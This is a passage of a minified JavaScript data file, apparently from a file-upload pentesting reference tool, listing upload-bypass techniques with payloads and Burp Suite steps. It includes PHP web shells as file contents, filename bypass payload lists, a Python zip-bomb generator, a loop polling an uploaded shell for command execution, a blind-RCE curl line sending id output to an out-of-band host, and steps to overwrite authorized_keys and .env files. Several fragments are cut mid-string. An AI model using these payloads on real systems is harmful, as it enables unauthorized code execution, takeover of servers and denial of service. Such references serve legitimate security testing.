ly Apache misconfigs)",description:"Use multiple extensions to trick parsers that check only the first or last extension.",howItWorks:'TWO behaviors — (A) AddHandler: Apache "AddHandler application/x-httpd-php .php" matches .php ANYWHERE in filename, so shell.php.jpg executes as PHP. (B) AddType: only the FINAL extension matters, so shell.php.jpg does NOT execute. Test both patterns — shell.php.jpg reveals AddHandler misconfig; shell.png.php reveals AddType or right-to-left parsing.',payloads:["shell.png.php","shell.php.jpg","shell.png.jpg.php","shell.txt.jpg.png.asp","shell.jpg.phtml"],steps:["Try pattern: <safe>.<dangerous> - e.g., shell.png.php","Try pattern: <dangerous>.<safe> - e.g., shell.php.jpg (Apache AddHandler misconfig)","Try three layers: shell.png.jpg.php","Test each upload - if the file executes as the dangerous type, bypass works."],expected:"File with double extension executes as the dangerous type.",note:"shell.php.jpg is especially dangerous on Apache with AddHandler - it executes as PHP!",files:[{name:"shell.png.php",content:"<?php system($_GET['cmd']); ?>",type:"text/plain"},{name:"shell.php.jpg",content:"<?php system($_GET['cmd']); ?>",type:"text/plain"},{name:"shell.txt.jpg.png.php",content:"<?php system($_GET['cmd']); ?>",type:"text/plain"}]},{id:"T003",name:"Null Byte Injection (%00)",risk:"Medium-High",server:"PHP < 5.3.4, C/C++",description:"Inject null byte to terminate the filename string. Validator sees .jpg, filesystem sees .php.",howItWorks:"C and PHP (before 5.3.4) use null-terminated strings. The validator may check the full filename and see .jpg, but when passing to libc functions like move_uploaded_file(), the string terminates at \\x00, so only 'shell.php' is used.",diagram:"Validator: shell.php[NUL].jpg -> checks extension '.jpg' ACCEPTED\\nFilesystem: shell.php\\0.jpg -> stops at \\0 -> saves as 'shell.php'",payloads:["shell.php%00.jpg","shell.php\\x00.png","shell.php%00.png%00.jpg","shell.php%0delete0.jpg"],steps:["Intercept upload request in Burp Suite.","In the filename parameter, insert null byte before the allowed extension.","Burp method: go to Hex tab, find the filename, replace the dot between extensions with 0x00.","Send request and check if file was saved with .php extension.","Access the file URL without the null byte part: /uploads/shell.php"],expected:"File saved as shell.php (null byte and everything after stripped).",troubleshooting:[{problem:"File saved as literal shell.php%00.jpg",solution:"Null byte not being processed. Try hex encoding in multipart body."},{problem:"Server returns 500 error",solution:"Server crashed processing null byte. This IS a vulnerability - document it."},{problem:"File rejected",solution:"Target uses modern PHP 5.3.4+ or has null byte filtering. Move to T002 or T004."}]},{id:"T004",name:"Special Characters at End",risk:"Medium",server:"Windows primarily",description:"Add special characters that are stripped by the filesystem, leaving the dangerous extension.",howItWorks:"Windows strips trailing dots and spaces from filenames. Uploading 'shell.php.' results in 'shell.php' being saved. Similarly, trailing slashes may cause path confusion.",payloads:["shell.php%20","shell.php%0a","shell.php%0d%0a","shell.php/","shell.php.\\","shell.php.","shell.php...."],steps:["For each special character, append it to the dangerous extension.","Upload via Burp Suite Repeater (browser may normalize characters).","Check saved filename in server response.","Test if the stripped version executes as code."],expected:"File saved with dangerous extension after character stripping.",note:"shell.php. is most reliable on Windows - dot is automatically stripped.",files:[{name:"shell.php.",content:"<?php system($_GET['cmd']); ?>",type:"text/plain"}]},{id:"T005",name:"Path Traversal in Filename",risk:"High",server:"All",description:"Use directory traversal sequences in the filename to escape the upload directory.",howItWorks:"If the application concatenates the uploaded filename directly into a path without sanitizing directory separators, ../../ sequences traverse up the directory tree.",payloads:["../../shell.php","../../../var/www/html/shell.php","../webshell.php","....//....//....//shell.php"],steps:["Identify the likely upload directory path.","Construct a filename with traversal sequences to reach web root.","Example: If uploads go to /var/www/uploads/, use ../../html/shell.php","Upload and check if file appears in the target location."],expected:"File written outside the intended upload directory.",note:"Combine with other techniques: ../../shell.php%00.jpg for double bypass."},{id:"T006",name:"Semicolon Injection (IIS)",risk:"High",server:"IIS < 7.0",description:"IIS treats semicolons as parameter delimiters, so shell.asp;.jpg executes as ASP.",howItWorks:"IIS parses the filename and treats everything after the semicolon as a parameter, not part of the filename. So shell.asp;.jpg is processed as shell.asp.",payloads:["shell.asp;.jpg","shell.asp;.txt","shell.asp;.png","shell.asp;.html"],steps:["Confirm target is running IIS (Server header, ASP errors).","Upload file with .asp;.jpg extension.","Navigate to uploaded file URL.","ASP code should execute despite .jpg 'extension'."],expected:"File executes as ASP despite having .jpg after semicolon."},{id:"T007",name:"NTFS Alternate Data Streams",risk:"Medium",server:"Windows/IIS",description:"Use NTFS ADS to create files with hidden content or bypass extension checks.",howItWorks:"NTFS supports alternate data streams accessed via colon. shell.asp::$DATA references the default data stream of shell.asp, effectively creating the file without the .jpg extension mattering.",payloads:["shell.asp::$DATA","shell.asp::$DATA.","shell.asax:.jpg"],steps:["Target must use Windows with NTFS filesystem.","Upload with ADS syntax in filename.","shell.asp::$DATA creates a non-empty ASP file.","The .jpg or other extension is part of the ADS name, not the actual file."],expected:"ASP file created via alternate data stream.",note:"Requires NTFS and Windows server environment."},{id:"T008",name:"Trailing Dot (CVE-2024-21546)",risk:"High",server:"PHP/Laravel",description:"Upload with trailing dot that gets stripped by handler, leaving dangerous extension.",howItWorks:"Some upload handlers (like UniSharp Laravel Filemanager < 2.9.1) trim trailing dots from filenames. Uploading shell.php. results in shell.php being saved.",payloads:["shell.php.","shell.asp.","shell.jsp."],steps:["Append a single dot to the dangerous extension.","Upload the file.","Check if the server strips the trailing dot.","Verify the saved file executes as the dangerous type."],expected:"File saved as shell.php (trailing dot stripped by handler)."},{id:"T009",name:"Unicode/Encoding Tricks",risk:"Low-Medium",server:"All",description:"Use Unicode characters and encoding to bypass string-based filters.",howItWorks:"Some filters do not properly normalize Unicode. Using lookalike characters (homoglyphs) or RTL override can bypass simple string matching.",payloads:["shell.%2Ephp (URL-encoded dot)","shell\\u2024php (Unicode dot U+2024)","shell\\u202Egpj.php (RTLO - visually appears as shell.phpjpg)"],steps:["Try URL-encoded variants of blocked characters.","Try Unicode homoglyphs for dots and slashes.","For RTLO: insert U+202E before extension to visually spoof filename.","Test if the server normalizes Unicode before filtering."]},{id:"T010",name:"Filename Length Truncation",risk:"Low",server:"Legacy",description:"Use very long filenames to cause buffer truncation, cutting off the allowed extension.",howItWorks:"On some legacy systems with fixed-size filename buffers (255 bytes on Linux), a very long filename can cause the allowed extension (.png) to be truncated, leaving the dangerous extension (.php).",diagram:"AAAA...AAAA(232 chars).php.png\\n                              truncated at 255 bytes\\nResult: AAAA...AAAA(232 chars).php <- dangerous extension remains!",steps:["Generate a filename of exactly 255 "Also test NUL byte: shell.php%00.txt — older PHP (<5.3.4) truncates at NUL, writing shell.php.","Record any revealed paths for use in path traversal (C007) or local file include attacks."],payloads:["shell|.php","shell<.php","shell>.php","shell*.php","shell?.php",'shell".php',"shell.php%00.jpg"],note:"Informational technique - use for path disclosure via error messages. Revealed C:\\ paths enable path traversal attacks."},{id:"T014",name:"Windows Short Name (8.3)",risk:"Medium",server:"Windows (older)",description:"Use 8.3 short filename format to reference files differently.",howItWorks:"Windows generates short 8.3 filenames for compatibility. .htaccess might be accessible as HTACCE~1, bypassing filters that check for the full name.",payloads:["HTACCE~1","SHELL~1.PHP","WEB~CON.CON"],note:"Less effective on modern Windows with 8.3 naming disabled."},{id:"T015",name:"Extension Before Valid Extension",risk:"Medium",server:"Apache (misconfigured)",description:"Put executable extension before valid one for misconfigured Apache servers.",howItWorks:'Apache with "AddHandler php5-script .php" (not AddType) matches any occurrence of .php in the filename. So file.php.png is executed as PHP because .php appears in the name.',payloads:["shell.php.png","shell.asp.jpg","shell.jsp.gif"],steps:["Upload file with dangerous extension BEFORE safe extension.","Requires Apache AddHandler (not AddType) misconfiguration.","Test if server executes based on any occurrence of extension."],expected:"Apache matches .php anywhere in filename, executes as PHP."},{id:"T016",name:"Dot File Upload",risk:"Low",server:"Apache/Windows",description:"Upload a file named '.' to write to parent directory.",howItWorks:"On Apache running on Windows, uploading a file named '.' to /www/uploads/ creates a file called 'uploads' (without extension) in the /www/ directory.",payloads:[".","..","..."],note:"Very specific edge case - limited practical impact."}]},wx={id:"C003",name:"Content-Type Bypass",description:"Techniques to bypass Content-Type (MIME type) validation. Content-Type is fully client-controllable and should never be trusted.",techniques:[{id:"T017",name:"Content-Type Header Spoofing",risk:"High",server:"All",description:"Change the Content-Type header to an accepted value while keeping malicious content.",howItWorks:"The Content-Type header in multipart/form-data is entirely controlled by the client. The server should verify content independently, but many trust this header.",steps:["Intercept the upload request in Burp Suite.","Find the Content-Type line in the multipart body (NOT the outer header).","Change it from application/x-php to image/png.","Forward the request and check if upload is accepted."],burpSteps:["Proxy > Intercept > ON. Upload any file in browser.","Request captured. Press Ctrl+R to send to Repeater.","In Repeater, find the INNER Content-Type (inside multipart body, after the filename line).","Change: Content-Type: application/x-php → Content-Type: image/jpeg","Keep filename='shell.php'. Press Ctrl+Space (Send).","Check response: success message or URL = bypass confirmed.","For bulk testing: Ctrl+I → send to Intruder. Mark §image/jpeg§. Load mimetypes wordlist. Start Attack.","Sort by Response Length. Different length = server treated it differently."],expected:"File accepted despite containing PHP code because Content-Type claims it's an image.",curlExample:'curl -F "file=@shell.php;type=image/png" http://target/upload'},{id:"T018",name:"Remove Content-Type",risk:"Medium",server:"All",description:"Omit the Content-Type header entirely from the multipart body.",howItWorks:"Some applications have fallback logic when Content-Type is missing - they may skip content validation entirely or default to permissive behavior.",steps:["In Burp Suite, delete the entire Content-Type line from the multipart part.","Forward the request.","Check if the server accepts the file without a Content-Type."],note:"The multipart boundary and Content-Disposition ll"},{name:"shell.png.php",content:`PNG\r

","Try uploading shell.asp::$DATA — on IIS 5/6, this creates/accesses the default $DATA stream of shell.asp.","The extension validator sees ::$DATA suffix and may not match extension rules.","IIS processes the file as ASP since the base extension is .asp.","Also try: shell.php:.jpg — the validator sees .jpg, but Windows stores content in the .php file's default stream.","For file read (bypassing execution protection): access shell.asp::$DATA URL to get raw ASP source code."],payloads:["shell.asp::$DATA","shell.asp::$DATA.","shell.asax:.jpg","shell.php:.jpg","shell.php::$DATA"],note:"shell.asp::$DATA creates a non-empty ASP file. The .jpg part is effectively ignored by NTFS. IIS 5/6 specific for the ::$DATA source disclosure variant. Older IIS only."},{id:"T092",name:"Windows Trailing Characters",risk:"Medium",server:"Windows",description:"Windows strips trailing dots and spaces from filenames.",howItWorks:"The Windows file system API (Win32) automatically strips trailing dots and spaces from filenames. This is a legacy compatibility behavior. A file saved as 'shell.php.' or 'shell.php ' is stored on disk as 'shell.php'. Upload validators that check the filename as-is see a dotted or spaced name that doesn't match their blocklist patterns, but the actual file on disk has the dangerous .php extension.",steps:["Upload shell.php. (trailing dot) — validator may not match .php because filename ends in '.'","Windows stores it as shell.php on disk (trailing dot stripped).","Navigate to /uploads/shell.php to execute.","Also try: shell.php (trailing space) — URL-encode as shell.php%20","Try shell.php: (trailing colon) — creates ADS on some Windows versions.","Try multiple dots: shell.php... — all stripped to shell.php","Shell.PHP. (mixed case + dot) — bypasses case-sensitive validators and strips to Shell.PHP → executes as PHP."],payloads:["shell.php.","shell.php...","shell.php ","shell.php:","shell.PHP.","shell.php%20","shell.php%2e"],note:"shell.php. is most reliable - trailing dot automatically stripped by Windows CreateFile(). Works on IIS. Validator sees shell.php. ≠ .php pattern, but disk stores shell.php."},{id:"T093",name:"Windows Reserved Names",risk:"Low",server:"Windows",description:"Upload files with Windows reserved names to trigger error messages revealing path/config info.",howItWorks:"Windows reserves certain device names that cannot be used as filenames: CON, PRN, AUX, NUL, COM1-COM9, LPT1-LPT9. When an application tries to create a file with one of these names, a Windows system error occurs. The resulting error message often reveals the full disk path, application framework, or server configuration — useful for path disclosure needed for subsequent attacks.",steps:["Try uploading files named: CON, NUL, PRN, AUX, COM1, LPT1","Observe the error message: it often reveals absolute disk paths like C:\\inetpub\\wwwroot\\uploads\\","Test with extensions too: NUL.jpg, CON.php — Windows treats base name as reserved regardless of extension.","Note any revealed paths for use in path traversal (C007) attacks.","Also try these names in directory creation fields (if any) — same behavior."],payloads:["CON","PRN","AUX","NUL","COM1","LPT1","NUL.jpg","CON.php"],note:"Causes errors - use for path disclosure via error messages. Windows rejects these names at the CreateFile() API level. Revealed paths (C:\\...) enable path traversal attacks."},{id:"T094",name:"Windows Invalid Characters",risk:"Low",server:"Windows",description:"Use forbidden characters to trigger error messages revealing internal paths.",howItWorks:`Windows file system forbids certain characters in filenames: < > : " / \\ | ? *. When these characters are passed to file handling code, different layers (web server, PHP, .NET, application code) produce different error messages at different stages. These error messages often reveal: absolute disk paths (C:\\inetpub\\wwwroot\\uploads\\), application framework details, server hostname, and internal logic.

"""
Zip Bomb Generator - C016/T102
Creates various decompression bombs for DoS testing.

import zipfile, gzip, io, os, sys

def make_zip_bomb(size_gb=1, filename="zip_bomb.zip"):
    """Single-layer zip bomb: N GB of zeros compressed."""
    size_bytes = size_gb * 1024 * 1024 * 1024
    print(f"[*] Creating {size_gb}GB zip bomb -> {filename}")
    bomb = io.BytesIO()
    with zipfile.ZipFile(bomb, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        # Write in 100MB chunks to avoid RAM exhaustion while creating
        chunk = b'\\x00' * (100 * 1024 * 1024)
        info = zipfile.ZipInfo("bomb_payload.txt")
        info.compress_type = zipfile.ZIP_DEFLATED
        with zf.open(info, 'w') as f:
            written = 0
            while written < size_bytes:
                to_write = min(len(chunk), size_bytes - written)
                f.write(chunk[:to_write])
                written += to_write
                print(f"\\r  Progress: {written // (1024*1024)}MB / {size_gb*1024}MB", end='', flush=True)
    print()
    with open(filename, 'wb') as f:
        f.write(bomb.getvalue())
    compressed = os.path.getsize(filename)
    print(f"[+] {filename}: {compressed // 1024}KB compressed -> {size_gb}GB extracted ({size_gb*1024*1024//compressed}:1 ratio)")

def make_gzip_bomb(size_mb=100, filename="gzip_bomb.gz"):
    """Single-layer gzip bomb."""
    size_bytes = size_mb * 1024 * 1024
    print(f"[*] Creating {size_mb}MB gzip bomb -> {filename}")
    with open(filename, 'wb') as out:
        with gzip.GzipFile(fileobj=out, mode='wb', compresslevel=9) as gz:
            gz.write(b'\\x00' * size_bytes)
    compressed = os.path.getsize(filename)
    print(f"[+] {filename}: {compressed // 1024}KB -> {size_mb}MB ({size_mb*1024//max(compressed//1024,1)}:1)")

    make_gzip_bomb(size_mb=min(size * 100, 500))
    print("\\n[*] Upload with: curl -F 'file=@zip_bomb.zip;type=application/zip' http://TARGET/upload")`,type:"text/x-python"}]},{id:"T103",name:"Image Processing Bomb",risk:"High",server:"Image processing",description:"Upload crafted image with huge declared dimensions causing excessive CPU/RAM in image libraries.",howItWorks:`Image processing libraries (ImageMagick, Pillow, GD) allocate memory based on declared image dimensions before reading pixel data. A PNG with width=65535, height=65535 claims 4GB of pixel data. When the library tries to allocate this before reading the compressed data, it either OOM crashes or exhausts swap.

onfiguration.",techniques:[{id:"B001",name:"Setup & Capture First Request",risk:"Info",server:"All",description:"Configure Burp and capture your first upload request.",howItWorks:"All upload testing starts with intercepting the multipart POST request in Burp Proxy. This gives you the raw request structure to understand what the server expects.",steps:["Open Burp Suite. Go to Proxy > Intercept > ON.","Configure your browser to use Burp proxy: 127.0.0.1:8080.","Upload any legitimate file (e.g., a real JPEG) in the target application.","The request appears in Proxy > Intercept tab.","Identify key fields: filename='' in Content-Disposition, Content-Type: in multipart body, file content/body.","Note the success response (200 + URL? JSON with path?) — this is your oracle.","Note the failure response (400 + 'invalid type'?) — for comparison.","Right-click → Send to Repeater (Ctrl+R). Right-click → Send to Intruder (Ctrl+I).","Turn Intercept OFF (Proxy > Intercept > OFF) for normal browsing."],note:"CRITICAL: Note BOTH success AND failure responses. Response length difference is your bypass indicator."},{id:"B002",name:"Repeater — Manual Bypass Testing",risk:"Info",server:"All",description:"Use Repeater to manually test each bypass technique one at a time.",howItWorks:"Repeater lets you resend requests with modifications and see the response immediately. Use it to confirm each bypass technique works before automating.",steps:["Open Repeater tab (Ctrl+Shift+R to cycle, or click Repeater in top menu).","Request is pre-loaded from Intercept. Send to confirm baseline (Ctrl+Space).","EXTENSION TEST: Find filename='shell.jpg'. Change 'jpg' to 'php'. Send. Check response.","MIME TEST: Find Content-Type: image/jpeg (in multipart body). Change to text/plain. Send.","MAGIC BYTES TEST: Switch to Hex view (right-click body → View as hex). Add 47 49 46 38 39 61 at byte 0 (GIF89a).","HTACCESS TEST: Change filename to '.htaccess'. Change Content-Type to text/plain. Replace body with: AddType application/x-httpd-php .jpg. Send.","TRAVERSAL TEST: Change filename to '../shell.php'. URL-encode if needed: ..%2fshell.php. Send.","Use ← → arrows in Repeater to compare responses between requests.","Pro tip: Use Ctrl+U to URL-encode selected text, Ctrl+Shift+U to decode."],note:"Keep a baseline tab (first working upload) to compare response lengths against bypass attempts."},{id:"B003",name:"Intruder — Extension Fuzzing (Sniper)",risk:"Info",server:"All",description:"Automate extension bypass testing with Burp Intruder in Sniper mode.",howItWorks:"Intruder sends the same request repeatedly with one parameter changed each time. Use it to test all PHP extension variants automatically.",steps:["Send upload request to Intruder (Ctrl+I from Repeater or right-click in Proxy History).","Go to Intruder tab → Positions sub-tab.","Click 'Clear §' button (removes all auto-detected positions).","In the request, find filename='shell.jpg'. SELECT just 'jpg' (the extension after the dot).","Click 'Add §' button → filename='shell.§jpg§'.","Attack type: Sniper (default, top dropdown).","Go to Payloads tab. Payload type: Simple list.","Add payloads: php, php3, php4, php5, php7, php8, phtml, pht, phar, inc, PHP, pHp, PhP, phps, pgif, shtml, phtml","Options tab → Grep - Match: Add patterns: 'url', 'success', '/uploads/', '.php'. Click Add.","Also add 'Invalid', 'error', 'blocked' as negative matches.","Click Start Attack. Wait for completion.","Sort results by Response Length column. Different length = server responded differently = potential bypass.","Click each interesting result to view full response. Look for upload URL in body."],note:"Burp Free = sequential requests. Burp Pro = parallel. Sequential still works, just slower."},{id:"B004",name:"Intruder — MIME Type Fuzzing (Sniper)",risk:"Info",server:"All",description:"Fuzz Content-Type header to find accepted MIME types.",steps:["Send request to Intruder. Clear §.","Find Content-Type: image/jpeg inside the multipart body (NOT the outer header).","Select 'image/jpeg'. Add § → Content-Type: §image/jpeg§.","Keep filename=shell.php (testing MIME bypass while extension is already dangerous).","Payloads: image/jpeg, image/png, image/gif, image/webp, image/svg+xml, image/bmp, image/tiff, application/octet-stream, application/x-php, text/plain, text/html, video/mp4","Start Attack. Sort by Length. Success response with .php filename accepted = MIME-only validation confirmed.","Combine with extension test: Try filename=shell.php + Content-Type=image/jpeg in Repeater to confirm both pass together."]},{id:"B005",name:"Intruder — Cluster Bomb (Extension × MIME)",risk:"Info",server:"All",description:"Test all combinations of extensions AND MIME types simultaneously.",steps:["Send to Intruder. Clear §.","Mark extension: filename='shell.§jpg§' (first position).","Mark MIME: Content-Type: §image/jpeg§ (second position).","Attack type: CLUSTER BOMB (dropdown at top).","Payload Set 1 (extension): php, php5, phtml, pht, PHP, pHp","Payload Set 2 (MIME): image/jpeg, image/png, application/octet-stream, text/plain","6 × 4 = 24 requests. Start Attack.","Filter: Status=200, sort by length. Each interesting combo: test execution manually in Repeater.","WARNING: Cluster bomb grows exponentially. Keep payload lists short."]},{id:"B006",name:"Intruder — Filename Traversal Fuzzing",risk:"Info",server:"All",description:"Fuzz path traversal sequences in filename parameter.",steps:["Send to Intruder. Clear §.","Find filename='shell.jpg'. Select the ENTIRE filename value (between quotes).","Add § → filename='§shell.jpg§'.","Payload type: Simple list. Load these traversal variants:","../shell.php, ../../shell.php, ../../../var/www/html/shell.php, ....//shell.php, ..%2fshell.php, ..%252fshell.php, ..%c0%afshell.php, ..\\ shell.php (Windows)","Add Payload Processing → URL-Encode: check 'Encode ALL characters' if server double-decodes.","Start Attack. Success = file written outside upload dir. Check if /shell.php accessible from webroot."]},{id:"B007",name:"Turbo Intruder — Race Condition",risk:"Info",server:"All",description:"Use Turbo Intruder to win upload race conditions. Required for timed bypasses.",howItWorks:"The single-packet attack (HTTP/2) sends all requests in one TCP packet, eliminating network jitter. All requests arrive simultaneously at the server, maximizing race condition win chance.",steps:["INSTALL: Extensions > BApp Store > search 'Turbo Intruder' > Install.","In Proxy History, right-click upload request → Extensions > Turbo Intruder > Send to Turbo Intruder.","Turbo Intruder opens with a Python script editor.","SELECT TEMPLATE from dropdown: 'examples/race-single-packet-attack.py'","The template sends 20 concurrent requests. The server processes them near-simultaneously.","MODIFY the script: set the number of race requests (default 20, increase to 50 for better odds).","ALSO run in a second terminal: for i in $(seq 1 100); do curl -s 'http://TARGET/uploads/shell.php?cmd=id' | grep -q 'uid=' && echo 'RCE!' && break; done","Click Attack. Watch for uid= in any response = race won.","If HTTP/2 not available: use 'examples/parallel-uploads.py' template instead.","NOTE: Race window is typically 10-500ms. Run multiple attempts if first fails."],note:"Single-packet attack only works with HTTP/2. Check if target supports it (Burp shows HTTP/2 in request info)."},{id:"B008",name:"Burp Collaborator — OOB Detection",risk:"Info",server:"All",description:"Use Burp Collaborator to detect blind XXE, SSRF, and RCE via out-of-band callbacks.",howItWorks:"When payloads execute but produce no direct visible output (blind), Collaborator provides a server that receives DNS/HTTP callbacks, proving the vulnerability exists.",steps:["SETUP: Burp > Burp Collaborator Client (top menu). Click 'Copy to clipboard' to get your unique URL: abc123.oastify.com","REPLACE: In ALL arsenal payloads, change 'attacker.com' → your collaborator URL.","POLL: In Collaborator window, click 'Poll now' every 30 seconds. OR check 'Poll every 60 seconds'.","XXE OOB TEST: Upload xxe_oob.svg with ENTITY SYSTEM 'http://abc123.oastify.com/test'. If Collaborator gets HTTP hit = XXE confirmed.","IMAGEMAGICK TEST: Upload shell_rce.mvg with fill 'url(https://abc123.oastify.com/|id)'. HTTP hit in Collaborator = ImageMagick processing + SSRF.","BLIND RCE TEST: Use payload: curl http://abc123.oastify.com/rce-$(id|base64). DNS/HTTP hit with encoded id output = RCE confirmed.","FFMPEG SSRF: M3U8 playlist with http://abc123.oastify.com/segment. Hit = FFmpeg SSRF confirmed.","Each Collaborator hit shows: source IP (the server's IP), timestamp, full HTTP request.","FREE ALTERNATIVE: interactsh-client (run: go install github.com/projectdiscovery/interactsh/...@latest && interactsh-client)"]},{id:"B009",name:"Match & Replace — Upload Automation Rules",risk:"Info",server:"All",description:"Configure Burp Match & Replace rules to automatically modify upload requests.",howItWorks:"Match & Replace runs on every proxied request, automatically transforming specified patterns. Set up rules to always change MIME types or filenames without manual editing.",steps:["ACCESS: Proxy > Options > Match and Replace section (scroll down) > Add.","RULE 1 — Auto-change MIME: Type=Request body, Match=Content-Type: image/jpeg, Replace=Content-Type: application/x-php. Enable.",'RULE 2 — Auto-change extension: Type=Request body, Match=filename="([^"]+)\\.(jpg|jpeg|png|gif)", Replace=filename="$1.php". Enable. (regex mode)',"RULE 3 — Add magic bytes: Type=Request body, Match=(Content-Disposition:.*?filename=.*?\\r\\n\\r\\n), Replace=$1GIF89a. Enable.",'RULE 4 — Strip size limits in response: Type=Response body, Match="maxSize":\\d+, Replace="maxSize":99999999. Prevents client-side size rejections.',"TOGGLE: Enable/disable rules by checkbox. Create named sets for different scenarios.","CAVEAT: Complex regex rules may break non-upload requests. Disable when done testing."]},{id:"B010",name:"Burp Extensions — Must-Install List",risk:"Info",server:"All",description:"Essential Burp extensions for upload vulnerability testing.",howItWorks:"Extensions add specialized scanning, automation, and UI capabilities. Install all of these before starting upload tests.",steps:["HOW TO INSTALL: Extensions (top menu) > BApp Store > Search name > Install > OK.","1. UPLOAD SCANNER: Auto-tests upload endpoints for 50+ vulnerabilities. Usage: Right-click upload request > Extensions > Upload Scanner > Active Scan Upload. Results appear in Dashboard > Issue Activity.","2. TURBO INTRUDER: Race conditions + high-speed attacks. Right-click > Extensions > Turbo Intruder > Send to Turbo Intruder.","3. LOGGER++: Log ALL requests with powerful filters. After install: Logger++ tab appears automatically. Use filter bar: Response contains 'uid=' → find RCE hits.","4. COLLABORATOR EVERYWHERE: Auto-injects Collaborator URLs into all parameters. Detects blind SSRF/XXE automatically.","5. PARAM MINER: Discovers hidden upload parameters. Right-click > Extensions > Param Miner > Guess params.","6. CONTENT TYPE CONVERTER: Converts JSON ↔ XML ↔ Multipart. Right-click > Extensions > Content Type Converter > Convert to multipart. Use: test if JSON endpoint accepts multipart uploads.","7. FREDDY (Deserialisation Scanner): Detects Java/PHP/.NET deserialization. Auto-runs passively. Use with PHAR upload techniques.","8. J2EESCAN: Java/JSP specific checks. Useful for JSP upload endpoints on Tomcat/JBoss.","9. BACKSLASH POWERED SCANNER: Finds SSTI/injection in filename fields. Right-click param > Actively scan insertion point."]},{id:"B011",name:"Scanner — Upload-Specific Configuration",risk:"Info",server:"All",description:"Configure Burp Scanner for maximum upload vulnerability detection.",steps:["ACTIVE SCAN: Proxy History > right-click upload POST request > Do active scan.","SCAN TYPE: Audit only (you already have the request, no crawl needed).","AUDIT COVERAGE: Thorough (tests more payloads, takes longer, finds more king, some don't. Depends on implementation."},{id:"W007",name:"Null Byte in Content-Type",risk:"Low-Medium",server:"All",description:"Inject null byte between MIME types to confuse WAF string parsing.",payload:"Content-Type: image/jpeg\\x00application/x-php",note:"Works against WAFs using C-style string functions that stop at null byte."}]},qx={id:"C026",name:"Business Logic & Authentication Bypass",description:"Bypass authentication, authorization, and business logic controls around file upload endpoints. These vulnerabilities exist in the application's logic, not the upload validation itself.",techniques:[{id:"BL001",name:"Unauthenticated Upload Test",risk:"Critical",server:"All",description:"Test if upload endpoint works without authentication.",howItWorks:"Upload endpoints are sometimes deployed without authentication requirements, especially APIs added quickly. Remove the session cookie and retry the upload.",steps:["Capture an authenticated upload request in Burp Repeater.","Delete the Cookie header entirely.","Also delete any Authorization header (Bearer token, Basic auth).","Send. If server returns 200 = unauthenticated upload confirmed.","Also try: replace session with an invalid token: Cookie: session=invalid123","Try expired JWT tokens if JWT auth is used."],burpSteps:["In Repeater, right-click the Cookie header → Delete header.","Also delete Authorization header if present.","Send. 200 = critical: unauthenticated upload!","Use Burp's Autorize extension: auto-tests every request with different auth levels."]},{id:"BL002",name:"IDOR in Upload Path",risk:"High",server:"All",description:"Change user ID in upload path to write files to another user's directory.",howItWorks:"If uploads are stored per-user (e.g., /uploads/USER_ID/file.jpg), the user ID parameter may not be validated server-side. Changing it uploads to another user's space, potentially overwriting their files.",steps:["Upload a file and note the stored path: /uploads/100/photo.jpg","In Burp, change the user_id parameter (or path) to 101 (another user).","Send PHP shell upload with user_id=101.","Access: /uploads/101/shell.php?cmd=id","Also try: user_id=1 (admin account) to overwrite admin's profile or config."],burpSteps:["In Repeater, find any user_id, uid, user, or account parameter in the upload request.","Change it to another user's ID (try sequential: if you are 100, try 99, 101, 1).","Send shell.php upload with the modified ID.","Test access: GET /uploads/TARGET_ID/shell.php?cmd=id"]},{id:"BL003",name:"File Size Client-Side Bypass",risk:"Medium",server:"All",description:"The size limit is only enforced client-side. Bypass with Burp intercept.",howItWorks:"Many apps check file size in JavaScript before uploading. This check is trivially bypassed by intercepting the POST request after the browser has already sent it.",steps:["Turn on Proxy > Intercept.","Attempt to upload a 'too large' file — browser sends it anyway (or fails silently).","Intercept the POST, then forward it.","The server may have no size limit or a much larger limit than shown in UI.","Alternatively: modify the JSON response that returns the size limit: maxSize → 99999999 (Match & Replace rule)."]},{id:"BL004",name:"Multipart vs JSON Confusion",risk:"Medium",server:"All",description:"App validates JSON upload but not multipart (or vice versa). Content Type Converter extension.",howItWorks:"Some apps implement upload validation for one content type (e.g., JSON with base64 file) but forget to validate the same endpoint when accessed via multipart/form-data. The Content Type Converter extension makes this trivial to test.",steps:["Install Content Type Converter extension (BApp Store).","Capture a JSON upload request (if app uses JSON API).","Right-click > Extensions > Content Type Converter > Convert to multipart.","Send PHP shell as multipart. Check if it bypasses JSON-based validation.","Also try the reverse: convert multipart upload to JSON with base64 body."]},{id:"BL005",name:"Role-Based Upload Bypass",risk:"High",server:"All",description:"Use admin upload endpoint as a regular user by changing role parameters.",steps:["Log in as regular user. Capture their session cookie.","Log in as admin. Capture admin upload request in Repeater.","Swap admin Cookie for regular user Cookie in the admin upload request.","Send. If 200 = server doesn't validate role for this endpoint.","Also try: if there's a role claim in JWT, modify it: 'role':'admin' → base64 encode → replace token section.","Try accessing admin upload URLs directly while logged in as regular user."]},{id:"BL006",name:"Upload to Delete/Overwrite Existing Files",risk:"High",server:"All",description:"Use path traversal + upload to overwrite critical files (config, .htaccess, auth keys).",howItWorks:"If upload path traversal works, target high-value files rather than just creating new ones.",steps:["Test: filename=../../.htaccess — can you overwrite the root .htaccess?","If yes: upload malicious .htaccess content to root to gain PHP execution.","Target: ../../authorized_keys with your SSH public key.","Target: ../../web.config to override IIS config.","Target: ../../.env to overwrite environment variables (DB passwords, API keys)."],payloads:["../../.htaccess","../../web.config","../../.env","../../config/database.php","../../authorized_keys"]}]},Ff={id:"C017",name:"Complete Testing Methodology & Checklist",description:"Systematic 15-phase approach to testing file upload functionality. Follow this order on every engagement for comprehensive coverage.",techniques:[{id:"M001",name:"Phase 1: Reconnaissance — Find All Upload Points",risk:"Info",server:"All",description:"Discover every file upload entry point in the application before testing any of them.",steps:["Profile picture / avatar upload","Document / attachment upload (tickets, comments, messages)","Import feature: CSV, XML, JSON, XLSX","Image gallery / media library","Resume / CV upload (HR apps)","Plugin / theme / module upload (CMS: WordPress, Drupal, Joomla)","API endpoints accepting multipart/form-data","WebDAV endpoints (OPTIONS request to find PUT/MOVE methods)","Admin file manager panels","Backup/restore functionality","Software update/patch upload features"],note:"Map ALL upload points before testing any. Different endpoints often have different validation logic."},{id:"M002",name:"Phase 2: Baseline — Document Normal Behavior",risk:"Info",server:"All",description:"Establish a clear baseline of success and failure responses before attempting bypasses.",steps:["Upload a legitimate file (expected type, correct extension, valid content).","Note exact success response: HTTP status, response body, upload URL/path.","Upload a file with wrong extension → note exact error message.","Upload file with wrong MIME type → note exact error.","Upload a file that's too large → note size limit error.","Note where uploaded files are stored (URL path, CDN, S3 